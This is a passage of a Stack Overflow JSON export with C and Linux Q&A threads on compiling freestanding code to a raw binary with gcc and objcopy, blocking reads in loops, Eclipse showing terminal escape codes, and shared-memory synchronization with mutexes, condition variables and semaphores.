"Boldar", "link": "https://stackoverflow.com/users/10779469/boldar"}, "edited": false, "score": 0, "creation_date": 1544629025, "post_id": 53742891, "comment_id": 94345239, "body": "Also, I won&#39;t need any syscall macros, as I will use inline asm and manually call int 80"}, {"owner": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "reply_to_user": {"reputation": 73, "user_id": 10779469, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8e03d108795b62ad12bcb34b8a422035?s=128&d=identicon&r=PG&f=1", "display_name": "Boldar", "link": "https://stackoverflow.com/users/10779469/boldar"}, "edited": false, "score": 0, "creation_date": 1544631425, "post_id": 53742891, "comment_id": 94346772, "body": "@Boldar: That&#39;s exactly what the syscall macros are, inline asm."}, {"owner": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "reply_to_user": {"reputation": 73, "user_id": 10779469, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8e03d108795b62ad12bcb34b8a422035?s=128&d=identicon&r=PG&f=1", "display_name": "Boldar", "link": "https://stackoverflow.com/users/10779469/boldar"}, "edited": false, "score": 0, "creation_date": 1544631491, "post_id": 53742891, "comment_id": 94346813, "body": "@Boldar: I added an example of how to generate a flat raw binary file containing the compiled position independent executable code from a C source file."}, {"owner": {"reputation": 73, "user_id": 10779469, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8e03d108795b62ad12bcb34b8a422035?s=128&d=identicon&r=PG&f=1", "display_name": "Boldar", "link": "https://stackoverflow.com/users/10779469/boldar"}, "edited": false, "score": 0, "creation_date": 1544639053, "post_id": 53742891, "comment_id": 94350862, "body": "Thank you, thats more or less what i want. One last Bonus: can i force a specific order of the functions? E.g. when i have code like in your example, can i tell gcc that i want the _start function to be the first in output? Or, how determines gcc the order of functions in the output?"}, {"owner": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "reply_to_user": {"reputation": 73, "user_id": 10779469, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8e03d108795b62ad12bcb34b8a422035?s=128&d=identicon&r=PG&f=1", "display_name": "Boldar", "link": "https://stackoverflow.com/users/10779469/boldar"}, "edited": false, "score": 0, "creation_date": 1544642567, "post_id": 53742891, "comment_id": 94352632, "body": "@Boldar: I don&#39;t know, but I think they are in the order they are defined. (That is, in the order the functions are implemented in, not in the order they are declared in.)"}], "tags": [], "owner": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "is_accepted": true, "score": 5, "last_activity_date": 1544631390, "last_edit_date": 1544631390, "creation_date": 1544617150, "answer_id": 53742891, "question_id": 53738012, "link": "https://stackoverflow.com/questions/53738012/use-gcc-to-directly-compile-to-machine-code-without-linking/53742891#53742891", "title": "use gcc to directly compile to machine code without linking", "body": "<blockquote>\n  <p>I want to get gcc to compile c-code for me into x86-32 linux binary code, but without any librarys or so around it.</p>\n</blockquote>\n\n<p>That means you write <em>freestanding</em> C code. (When the standard library is available, you have a <em>hosted</em> environment; when not, a <em>freestanding</em> one. )</p>\n\n<p>To compile e.g. foo.c to an executable, foo, make sure it has a <code>_start()</code> function, and use</p>\n\n<pre><code>gcc -march=i686 -mtune=generic -m32 -ffreestanding -nostdlib -nostartfiles foo.c -o foo\n</code></pre>\n\n<p>The GNU toolchain uses the address of the <code>_start</code> symbol to encode the start address of the executable in the ELF file.</p>\n\n<p><a href=\"https://stackoverflow.com/a/39932430/1475978\">This answer</a> is an actual real-world example for x86-64.  For x86-32 (or any other architecture), you'll need to adjust the <code>SYSCALL_</code> macros.</p>\n\n<hr>\n\n<p>In a comment, OP explains they want a binary blob, instead of an ELF executable.</p>\n\n<p>In this case, it is best to tell the compiler to generate a <a href=\"https://en.wikipedia.org/wiki/Position-independent_code\" rel=\"nofollow noreferrer\">position independent executable</a>. For example, 'blob.c':</p>\n\n<pre><code>void do_something(int arg)\n{\n    /* Do something with arg, perhaps a syscall,\n       or inline assembly? */\n}\n\nvoid loop_something(int from, int to)\n{\n    int  arg;\n\n    if (from &lt;= to)\n        for (arg = from; arg &lt;= to; arg++)\n            do_something(arg);\n    else\n        for (arg = from; arg &lt;= to; arg--)\n            do_something(arg);\n}\n\nvoid _start(void)\n{\n    loop_something(2, 5);\n    do_something(6);\n    loop_something(5, 2);\n    do_something(1);\n}    \n</code></pre>\n\n<p>I do recommend declaring all functions except <code>_start</code> as <code>static</code>, to avoid any global offset table (GOT) or procedure linkage table (PLT) references (like <code>&lt;__x86.get_pc_thunk.bx&gt;</code> calls).</p>\n\n<p>Compile this to an position independent executable using e.g.</p>\n\n<pre><code>gcc -march=i686 -mtune=generic -m32 -O2 -fPIE -ffreestanding -nostdlib -nostartfiles blob.c -o blob\n</code></pre>\n\n<p>strip it,</p>\n\n<pre><code>strip --strip-all blob\n</code></pre>\n\n<p>and dump the contents of the binary:</p>\n\n<pre><code>objdump -fd blob\n</code></pre>\n\n<p>In this output, there are two important lines:</p>\n\n<pre><code>start address 0x08048120\n</code></pre>\n\n<p>which tells the address of the <code>_start</code> symbol, and</p>\n\n<pre><code>080480e0 &lt;.text&gt;:\n</code></pre>\n\n<p>which tells the offset of the code, in hexadecimal.  Subtract the former from the latter (0x08048120 - 0x080480e0 = 0x40 = 64) to get the offset of the start symbol.</p>\n\n<p>Finally, dump the code into a raw binary file 'blob.raw' using</p>\n\n<pre><code>objcopy -O binary -j .text blob blob.raw\n</code></pre>\n"}], "owner": {"reputation": 73, "user_id": 10779469, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8e03d108795b62ad12bcb34b8a422035?s=128&d=identicon&r=PG&f=1", "display_name": "Boldar", "link": "https://stackoverflow.com/users/10779469/boldar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 868, "favorite_count": 0, "accepted_answer_id": 53742891, "answer_count": 1, "score": 1, "last_activity_date": 1544631390, "creation_date": 1544599688, "question_id": 53738012, "link": "https://stackoverflow.com/questions/53738012/use-gcc-to-directly-compile-to-machine-code-without-linking", "title": "use gcc to directly compile to machine code without linking", "body": "<p>i want to get gcc to compile c-code for me into x86-32 linux binary code, but without any librarys or so around it.\nI just want to specify an address at the start, and it should assume it has been loaded there. I will then manually build an elf file from the output by hand and set up everything.</p>\n\n<p>I know how to do something like this using NASM, but i have something more complicated in mind where i don't want to use only assembler. I dont need any librarys, i will use pure syscalls with inline asm. I also do not care much if it looses some portability.</p>\n\n<p>I tried around a bit, but could not find a way to do that.\nCan someone not only provide me with the correct settings for that, but also some background on the compile and linker parameters?\nI tried searching through the gcc manual, but found it very confusing.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 30540, "user_id": 719263, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7feab598abfc27783641fe2b796a0155?s=128&d=identicon&r=PG", "display_name": "Jean-Baptiste Yun&#232;s", "link": "https://stackoverflow.com/users/719263/jean-baptiste-yun%c3%a8s"}, "edited": false, "score": 5, "creation_date": 1544598407, "post_id": 53737693, "comment_id": 94328142, "body": "putting it in a loop will NOT change its behavior"}, {"owner": {"reputation": 1052, "user_id": 3698648, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/199b49d13342baa233c08aac5793ed4d?s=128&d=identicon&r=PG&f=1", "display_name": "ntshetty", "link": "https://stackoverflow.com/users/3698648/ntshetty"}, "edited": false, "score": 0, "creation_date": 1544599012, "post_id": 53737693, "comment_id": 94328385, "body": "blocking call is always wait for event, it doesn&#39;t matter where you call.. in case of loop does same operation repeatedly.. Kind of deadlock."}, {"owner": {"reputation": 71, "user_id": 8719173, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1f284a35900ac72b957eb1321b9cb8fa?s=128&d=identicon&r=PG&f=1", "display_name": "Navneet", "link": "https://stackoverflow.com/users/8719173/navneet"}, "reply_to_user": {"reputation": 1052, "user_id": 3698648, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/199b49d13342baa233c08aac5793ed4d?s=128&d=identicon&r=PG&f=1", "display_name": "ntshetty", "link": "https://stackoverflow.com/users/3698648/ntshetty"}, "edited": false, "score": 0, "creation_date": 1544601013, "post_id": 53737693, "comment_id": 94329187, "body": "@ThiruShetty: Does that mean that the for loop won&#39;t continue until the blocking function returns?"}, {"owner": {"reputation": 368, "user_id": 10735689, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aPtkk.png?s=128&g=1", "display_name": "ShivYaragatti", "link": "https://stackoverflow.com/users/10735689/shivyaragatti"}, "edited": false, "score": 0, "creation_date": 1544602962, "post_id": 53737693, "comment_id": 94330083, "body": "@Navneet  yes, loop will continue only after blocking function returns, then  executes rest of the statements in the loop, then next iteration,  but  it is not deadlock"}, {"owner": {"reputation": 1052, "user_id": 3698648, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/199b49d13342baa233c08aac5793ed4d?s=128&d=identicon&r=PG&f=1", "display_name": "ntshetty", "link": "https://stackoverflow.com/users/3698648/ntshetty"}, "reply_to_user": {"reputation": 368, "user_id": 10735689, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aPtkk.png?s=128&g=1", "display_name": "ShivYaragatti", "link": "https://stackoverflow.com/users/10735689/shivyaragatti"}, "edited": false, "score": 0, "creation_date": 1544606137, "post_id": 53737693, "comment_id": 94331771, "body": "@ShivYaragatti i mean to say infinite loop and doesn&#39;t allow other things to execute for ever."}, {"owner": {"reputation": 368, "user_id": 10735689, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aPtkk.png?s=128&g=1", "display_name": "ShivYaragatti", "link": "https://stackoverflow.com/users/10735689/shivyaragatti"}, "reply_to_user": {"reputation": 1052, "user_id": 3698648, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/199b49d13342baa233c08aac5793ed4d?s=128&d=identicon&r=PG&f=1", "display_name": "ntshetty", "link": "https://stackoverflow.com/users/3698648/ntshetty"}, "edited": false, "score": 0, "creation_date": 1544607137, "post_id": 53737693, "comment_id": 94332423, "body": "@Thiru Shetty,  right for(;;) infinite loop but we can&#39;t say it as deadlock, deadlock means nothing is working, but here loop is working as expected by calling blocking function, all process or event handles will be in infinte loop all the time(throughout process life time), if we call  infinite loop as deadlock it would mislead understanding of things,  if it doesn&#39;t allow others to run that we call as CPUHOG not deadlock."}], "answers": [{"tags": [], "owner": {"reputation": 2492, "user_id": 472974, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0d76e11f423f0b0dab9706b385e386fe?s=128&d=identicon&r=PG", "display_name": "Devan Buggay", "link": "https://stackoverflow.com/users/472974/devan-buggay"}, "is_accepted": false, "score": 0, "last_activity_date": 1544598439, "creation_date": 1544598439, "answer_id": 53737724, "question_id": 53737693, "link": "https://stackoverflow.com/questions/53737693/blocking-function-in-a-loop/53737724#53737724", "title": "Blocking function in a loop", "body": "<p>If <code>os_io_read()</code> blocks it blocks. Putting it in a <code>for</code> loop will not affect this behavior.</p>\n"}, {"tags": [], "owner": {"reputation": 8001, "user_id": 307297, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/e28FD.png?s=128&g=1", "display_name": "chris01", "link": "https://stackoverflow.com/users/307297/chris01"}, "is_accepted": false, "score": 0, "last_activity_date": 1544598816, "creation_date": 1544598816, "answer_id": 53737811, "question_id": 53737693, "link": "https://stackoverflow.com/questions/53737693/blocking-function-in-a-loop/53737811#53737811", "title": "Blocking function in a loop", "body": "<p>If you put it in a loop it will do its job repeatetly. The loop does not affedt whats inside of it in any way.</p>\n\n<p>Normally if handling a problem that comes with a sort of \"realtime\" aspect it is a good idea to not use blocking - so you have always the control. Use non-blocking instead and check the return-codes if it read something or just returned by no data.</p>\n"}], "owner": {"reputation": 71, "user_id": 8719173, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1f284a35900ac72b957eb1321b9cb8fa?s=128&d=identicon&r=PG&f=1", "display_name": "Navneet", "link": "https://stackoverflow.com/users/8719173/navneet"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 95, "favorite_count": 0, "answer_count": 2, "score": -4, "last_activity_date": 1544601452, "creation_date": 1544598300, "last_edit_date": 1544601452, "question_id": 53737693, "link": "https://stackoverflow.com/questions/53737693/blocking-function-in-a-loop", "title": "Blocking function in a loop", "body": "<p>What happens if we put a blocking function in a loop in C program? For example:\nI have a function named <code>os_io_read()</code> which basically reads the serial (RS232) input buffer and waits till we have some input in that buffer sourced from some other device. Now if I put this function in a <code>for(;;)</code> loop, is it still going to wait for the data or the loop will continue. In my case I have a  hardware device running Linux OS and the hardware goes to ERROR mode if I try to execute a C program in the mentioned way. </p>\n\n<p>I hope my question is clear. </p>\n"}, {"tags": ["c", "eclipse", "std"], "comments": [{"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1544596887, "post_id": 53737202, "comment_id": 94327560, "body": "Note, most users here prefer textual information to be provided (also) in textual form. Some even downvote otherwise. (I did not though.)"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1544596985, "post_id": 53737202, "comment_id": 94327598, "body": "Please avoid the impression that your &quot;follow up&quot; is a separate question, making two questions in one post. Users here might consider a package of two questions in one to be &quot;too broad&quot;."}, {"owner": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "edited": false, "score": 0, "creation_date": 1544597275, "post_id": 53737202, "comment_id": 94327732, "body": "That display doesn&#39;t appear to understand terminal control strings. (It might not use a terminal or pseudo terminal at all, just capture the program&#39;s standard output via a pipe and display it in a text widget.)"}, {"owner": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "edited": false, "score": 1, "creation_date": 1544597354, "post_id": 53737202, "comment_id": 94327765, "body": "It&#39;s generally considered poor practice to try to clear a terminal display anyways."}, {"owner": {"user_type": "does_not_exist", "display_name": "user10778679"}, "reply_to_user": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1544646808, "post_id": 53737202, "comment_id": 94354540, "body": "@Yunnosch Thanks for all of your edits and feedback. If there&#39;s anything else that I you think I should change or make note of, feel free to let me know."}, {"owner": {"user_type": "does_not_exist", "display_name": "user10778679"}, "reply_to_user": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "edited": false, "score": 0, "creation_date": 1544646920, "post_id": 53737202, "comment_id": 94354585, "body": "@Shawn Thanks for letting me know. I&#39;ll keep that in mind."}], "answers": [{"tags": [], "owner": {"reputation": 119882, "user_id": 3545273, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/RDWxl.png?s=128&g=1", "display_name": "Serge Ballesta", "link": "https://stackoverflow.com/users/3545273/serge-ballesta"}, "is_accepted": true, "score": 2, "last_activity_date": 1544597284, "creation_date": 1544597284, "answer_id": 53737485, "question_id": 53737202, "link": "https://stackoverflow.com/questions/53737202/why-does-eclipses-c-application-launch-terminal-print-garbage-upon-invoking-sy/53737485#53737485", "title": "Why does Eclipse&#39;s C application launch terminal print garbage upon invoking `system(&quot;clear&quot;)` (defined in stdlib.h)?", "body": "<p>Well, everything works as expected here.</p>\n\n<p>Dinosaurs can remember the time where we used serial terminals. In those old days, we all knew that screen formatting was done with special control sequences. Unix-Linux terminals (console, xterm and friends) still use that good old terminfo interface, where the screen capabilities and special sequences are declared in the terminfo database with the key given by the <code>TERM</code> environment variable.</p>\n\n<p>According to your eclipse image, <code>clear</code> just sent the sequence <code>Esc [ 3 J Esc [ H Esc [ 2 J</code>. A terminal would clear when it receives that, but Eclipse output window just displays it to help the developper to know what control characters were send. You can even see the 1B ascii code of the Esc control character in the small squares when you look at the image in full resolution...</p>\n\n<p>That means that there is nothing to do here: you asked the program to send the <em>clear</em> escape sequence, and Eclipse output window confirms it was actually send.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user10778679"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 88, "favorite_count": 0, "accepted_answer_id": 53737485, "answer_count": 1, "score": -1, "last_activity_date": 1544646513, "creation_date": 1544595804, "last_edit_date": 1544646513, "question_id": 53737202, "link": "https://stackoverflow.com/questions/53737202/why-does-eclipses-c-application-launch-terminal-print-garbage-upon-invoking-sy", "title": "Why does Eclipse&#39;s C application launch terminal print garbage upon invoking `system(&quot;clear&quot;)` (defined in stdlib.h)?", "body": "<p>I am using Eclipse Oxygen.3A for development with C, and the operating system on which I'm running is Fedora 28. The C project that I am attempting to debug contains multiple instances of <code>system(\"clear\");</code>. When I would compile and run the application from Fedora's local terminal, any calls to <code>system()</code> would behave normally. After using Eclipse's debug tools to \"step over\" the statement and execute it, the launch terminal printed garbage (see screenshot below). The same output is printed every time the program is run. </p>\n\n<p><img src=\"https://i.stack.imgur.com/H4nKl.png\" alt=\"Eclipse debug console printing garbage after &lt;code&gt;system(&quot;clear&quot;)&lt;/code&gt; is executed\"></p>\n\n<p>I created a new project with the same environment variables which isolated that statement, but received the same result (see screenshot below). The only environment variable present in either launch configuration is <code>TERM</code> which is set to <code>xterm-256color</code> (the value printed by Fedora's local terminal when given the input <code>echo $TERM</code>). I couldn't find any results online pertaining to this particular issue, and don't understand how the function is implemented during compilation.</p>\n\n<p><img src=\"https://i.stack.imgur.com/uznrD.png\" alt=\"Separate &quot;Test&quot; project producing the same result\"></p>\n\n<p>Contents of source file in Test project:\n    #include </p>\n\n<pre><code>int main(void) {\n    system(\"clear\");\n    return 0;\n}\n</code></pre>\n\n<p>Generated output:\n<code>'[ESC]' + \"[3J\" + '[ESC]' + \"[H\" + '[ESC]' + \"2J\"</code></p>\n\n<p>Note: Imagine this string concatenated. I couldn't write the output literally because StackOverflow is unable to represent the \"escape\" character.</p>\n\n<p>My knowledge of Linux, bash and the tools provided by GNU is fairly limited, so let me know if any more information on this case would be helpful along with how to obtain it. Also, any feedback on how I could improve this post is welcome.</p>\n"}, {"tags": ["c", "linux", "shared-memory"], "comments": [{"owner": {"reputation": 3787, "user_id": 393436, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/db944a31ba8a5c51c43b8670b9dc737a?s=128&d=identicon&r=PG", "display_name": "Raghuram", "link": "https://stackoverflow.com/users/393436/raghuram"}, "edited": false, "score": 1, "creation_date": 1544595024, "post_id": 53736985, "comment_id": 94326897, "body": "You need to use Semaphore. Refer to this <a href=\"https://stackoverflow.com/questions/30121124/shared-memory-and-posix-semaphores?rq=1\" title=\"shared memory and posix semaphores\">stackoverflow.com/questions/30121124/&hellip;</a>"}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 2, "creation_date": 1544595294, "post_id": 53736985, "comment_id": 94327007, "body": "<b><code>int main</code></b>."}, {"owner": {"reputation": 331, "user_id": 1434287, "user_type": "registered", "accept_rate": 12, "profile_image": "https://www.gravatar.com/avatar/febc28ddca96272600049a2b40331128?s=128&d=identicon&r=PG", "display_name": "user1434287", "link": "https://stackoverflow.com/users/1434287/user1434287"}, "edited": false, "score": 0, "creation_date": 1544596479, "post_id": 53736985, "comment_id": 94327417, "body": "in the example, they are using 4 semaphores; I do not know their purpose; but just using 1 semaphore also we can use synchronization I guess."}, {"owner": {"reputation": 331, "user_id": 1434287, "user_type": "registered", "accept_rate": 12, "profile_image": "https://www.gravatar.com/avatar/febc28ddca96272600049a2b40331128?s=128&d=identicon&r=PG", "display_name": "user1434287", "link": "https://stackoverflow.com/users/1434287/user1434287"}, "edited": false, "score": 1, "creation_date": 1544596525, "post_id": 53736985, "comment_id": 94327439, "body": "so instead of using flag; we can use semaphore"}], "answers": [{"tags": [], "owner": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "is_accepted": true, "score": 3, "last_activity_date": 1544628712, "creation_date": 1544628712, "answer_id": 53746363, "question_id": 53736985, "link": "https://stackoverflow.com/questions/53736985/how-synchronization-is-done-in-shared-memory-data-linux-c/53746363#53746363", "title": "how synchronization is done in shared memory data linux c", "body": "<blockquote>\n  <p>Can anyone tell if there is better way of synchronization in shared memory?</p>\n</blockquote>\n\n<p>Definitely, yes.  I would say the way you waste CPU cycles in busy-wait (<code>while (ShmPTR-&gt;status != FILLED) ;</code>) is already a fatal mistake.</p>\n\n<p>Note that POSIX shared memory has a much more sensible interface than the old SysV does. See <a href=\"http://man7.org/linux/man-pages/man7/shm_overview.7.html\" rel=\"nofollow noreferrer\">man 7 shm_overview</a> for details.</p>\n\n<p>There are two distinct purposes for synchronization primitives:</p>\n\n<ol>\n<li><p>Data synchronization</p>\n\n<p>To protect data against concurrent modification, and to ensure each reader gets a consistent view of the data, there are three basic approaches:</p>\n\n<ul>\n<li><p>Atomic access</p>\n\n<p>Atomic access requires hardware support, and is typically only supported for native machine word sized units (32 or 64 bits).<br>&nbsp;</p></li>\n<li><p>Mutexes and condition variables</p>\n\n<p>Mutexes are mutually exclusive locks. The idea is to grab the mutex before examining or modifying the value.</p>\n\n<p>Condition variables are basically unordered queues for threads or processes to wait for a \"condition\". POSIX pthreads library includes facilities for atomically releasing a mutex and waiting on a condition variable. This makes waiting for a dataset to change trivial to implement, if each modifier signals or broadcasts on the condition variable after each modification.<br>&nbsp;</p></li>\n<li><p>Read-write locks.</p>\n\n<p>An rwlock is a primitive that allows any number of concurrent \"read locks\", but only one \"write lock\" to be held on it at any time.  The idea is that each reader grabs a read lock before examining the data, and each writer a write lock before modifying it.  This works best when the data is more often examined than modified, and a mechanism for waiting for a change to occur is not needed.<br>&nbsp;</p></li>\n</ul></li>\n<li><p>Process synchronization</p>\n\n<p>There are situations where threads and processes should wait (<a href=\"https://en.wikipedia.org/wiki/Blocking_(computing)\" rel=\"nofollow noreferrer\">block</a>) until some event has occurred.  There are two most common primitives used for this:</p>\n\n<ul>\n<li><p>Semaphores</p>\n\n<p>A <a href=\"http://man7.org/linux/man-pages/man7/sem_overview.7.html\" rel=\"nofollow noreferrer\">POSIX semaphore</a> is basically an opaque nonnegative counter you initialize to whatever (zero or positive value, within the limits set by the implementation). </p>\n\n<p><code>sem_wait()</code> checks the counter. If it is nonzero, it decrements the counter and continues execution. If the counter is zero, it blocks until another thread/process calls <code>sem_post()</code> on the counter.</p>\n\n<p><code>sem_post()</code> increments the counter. It is one of the rare synchronization primitives you can use in a <a href=\"http://man7.org/linux/man-pages/man7/signal-safety.7.html\" rel=\"nofollow noreferrer\">signal handler</a>.<br>&nbsp;</p></li>\n<li><p>Barriers</p>\n\n<p>A barrier is a synchronization primitive that blocks until there is a specific number of threads or processes blocking in the barrier, then releases them all at once.</p>\n\n<p>Linux does not implement POSIX barriers (<code>pthread_barrier_init()</code>, <code>pthread_barrier_wait()</code>, <code>pthread_barrier_destroy()</code>), but you can easily achieve the same using a mutex, a counter (counting the number of additional processes needed to release all waiters), and a condition variable.<br>&nbsp;</p></li>\n</ul></li>\n</ol>\n\n<hr>\n\n<p>There are many better ways of implementing the said server-client pair (where shared memory contains a flag and some data).</p>\n\n<p>For data integrity and change management, a mutex and one or two condition variables should be used. (If the server may change the data at any time, one condition variable (<code>changed</code>) suffices; if the server must wait until a client has read the data before modifying it, two are needed (<code>changed</code> and <code>observed</code>).)</p>\n\n<p>Here is an example structure you could use to describe the shared memory segment:</p>\n\n<pre><code>#ifndef   SHARED_H\n#define   SHARED_H\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;pthread.h&gt;\n\nstruct shared_data {\n    /* Shared memory data */\n};\n\nstruct shared {\n    pthread_mutex_t     lock;\n    pthread_cond_t      change;     /* Condition variable for clients waiting on data changes */\n    pthread_cond_t      observe;    /* Condition variable for server waiting on data observations */\n    unsigned long       changed;    /* Number of times data has been changed */\n    unsigned long       observed;   /* Number of times current data has been observed */\n    struct shared_data  data;\n};\n\n/* Return the size of 'struct shared', rounded up to a multiple of page size. */\nstatic inline size_t  shared_size_page_aligned(void)\n{\n    size_t  page, size;\n    page = (size_t)sysconf(_SC_PAGESIZE);\n    size = sizeof (struct shared) + page - 1;\n    return size - (size % page);\n}\n\n#endif /* SHARED_H */\n</code></pre>\n\n<p>The <code>changed</code> and <code>observed</code> fields are counters, that help avoid any time-of-check-to-time-of-use race windows. It is important that before the shared memory is accessed the thread does <code>pthread_mutex_lock(&amp;(shared_memory-&gt;lock))</code>, to ensure a consistent view of the data.</p>\n\n<p>If a thread/process examines the data, it should do</p>\n\n<pre><code>    shared_memory-&gt;observed++;\n    pthread_cond_broadcast(&amp;(shared_memory-&gt;observe));\n    pthread_mutex_unlock(&amp;(shared_memory-&gt;lock));\n</code></pre>\n\n<p>and if a thread/process modifies the data, it should do</p>\n\n<pre><code>    shared_memory-&gt;modified++;\n    shared_memory-&gt;observed = 0;\n    pthread_cond_broadcast(&amp;(shared_memory-&gt;change));\n    pthread_mutex_unlock(&amp;(shared_memory-&gt;lock));\n</code></pre>\n\n<p>to notify any waiters and update the counters, when unlocking the mutex.</p>\n"}], "owner": {"reputation": 331, "user_id": 1434287, "user_type": "registered", "accept_rate": 12, "profile_image": "https://www.gravatar.com/avatar/febc28ddca96272600049a2b40331128?s=128&d=identicon&r=PG", "display_name": "user1434287", "link": "https://stackoverflow.com/users/1434287/user1434287"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2813, "favorite_count": 1, "accepted_answer_id": 53746363, "answer_count": 1, "score": 0, "last_activity_date": 1544628712, "creation_date": 1544594749, "question_id": 53736985, "link": "https://stackoverflow.com/questions/53736985/how-synchronization-is-done-in-shared-memory-data-linux-c", "title": "how synchronization is done in shared memory data linux c", "body": "<p>I was asked a question in interview, how synchronization is done in shared memory. I told Take a struct. In that you have a flag and a data. Test the flag and change the data.\nI took the following program from internet as below-. Can anyone tell if there is better way of synchronization in shared memory</p>\n\n<pre><code>#define  NOT_READY  -1\n#define  FILLED     0\n#define  TAKEN      1\n\nstruct Memory {\n     int  status;\n     int  data[4];\n};\n</code></pre>\n\n<p>Assume that the server and client are in the current directory. The server uses ftok() to generate a key and uses it for requesting a shared memory. Before the shared memory is filled with data, status is set to NOT_READY. After the shared memory is filled, the server sets status to FILLED. Then, the server waits until status becomes TAKEN, meaning that the client has taken the data. </p>\n\n<p>The following is the server program. Click here to download a copy of this server program server.c. </p>\n\n<pre><code>#include  &lt;stdio.h&gt;\n#include  &lt;stdlib.h&gt;\n#include  &lt;sys/types.h&gt;\n#include  &lt;sys/ipc.h&gt;\n#include  &lt;sys/shm.h&gt;\n\n#include  \"shm-02.h\"\n\nvoid  main(int  argc, char *argv[])\n{\n     key_t          ShmKEY;\n     int            ShmID;\n     struct Memory  *ShmPTR;\n\n     if (argc != 5) {\n          printf(\"Use: %s #1 #2 #3 #4\\n\", argv[0]);\n          exit(1);\n     }\n\n     ShmKEY = ftok(\".\", 'x');\n     ShmID = shmget(ShmKEY, sizeof(struct Memory), IPC_CREAT | 0666);\n     if (ShmID &lt; 0) {\n          printf(\"*** shmget error (server) ***\\n\");\n          exit(1);\n     }\n     printf(\"Server has received a shared memory of four integers...\\n\");\n\n     ShmPTR = (struct Memory *) shmat(ShmID, NULL, 0);\n     if ((int) ShmPTR == -1) {\n          printf(\"*** shmat error (server) ***\\n\");\n          exit(1);\n     }\n     printf(\"Server has attached the shared memory...\\n\");\n\n     ShmPTR-&gt;status  = NOT_READY;\n     ShmPTR-&gt;data[0] = atoi(argv[1]);\n     ShmPTR-&gt;data[1] = atoi(argv[2]);\n     ShmPTR-&gt;data[2] = atoi(argv[3]);\n     ShmPTR-&gt;data[3] = atoi(argv[4]);\n     printf(\"Server has filled %d %d %d %d to shared memory...\\n\",\n            